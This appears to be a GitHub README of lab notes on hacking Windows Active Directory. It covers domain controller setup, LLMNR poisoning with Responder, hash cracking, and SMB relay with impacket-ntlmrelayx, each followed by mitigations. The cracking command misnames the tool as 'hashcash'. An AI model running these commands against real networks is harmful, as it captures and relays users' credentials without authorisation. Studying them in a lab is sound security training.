# Windows-Active-Directory-Hacking
The repo contains information on how to hack a windows active directory. REFERENCE: TCM ACADEMY
Active Directory Overview
Physical Active directory components
Logical active directory component
Requirements - One windows server(Windows 2022, two windows 10 Machines)
Setting up the Windows server,
Make sure you rename the windows server (in my case, UNCLE-DC)
promote the windows server to a domain controller by installing,  Active Directory Domain Services from the server manager, you can name your forest as anything but in my case i named it FKEYS.local
also make sure to install Active directory certificate services for other attacks that will considered for other attacks later

Attacking Active Directory: Initial Attack Vectors
1. LLMNR Poisoning

Sudo responder -I eth0 -ldwPv
<img width="696" height="197" alt="image" src="https://github.com/user-attachments/assets/9d0d67af-20d0-4068-b26c-d3cc71c62a3b" />

simulate an event occuring.= - 

hashcash -m 5600 hashes.txt /path/to/wordlist/ 
<img width="1877" height="390" alt="image" src="https://github.com/user-attachments/assets/da11dacb-30ec-435e-963f-008ea1ae7db7" />

LLMNR Mitigation
turn off LLMNR
if LLMNR is needed. It should have strong access control(password)

2. SMB Relay attacks

smb signing disable or not enforced on the target
The relayed user credential must be an admin 

from the responder setting (/etc/responder/Responder.conf), switch off SMB and HTTP flag
then run the command Sudo responder -I eth0 -ldwPv
impacket-ntlmrelayx -tf target.txt -smb2support 
then trigger an event by pointing the attacker IP from the windows PC
<img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />

SMB relay attacks mitigation
a. enable smb signing on all devices
b. disable NTLM authentication
c. account tiering
d. Local admin restriction
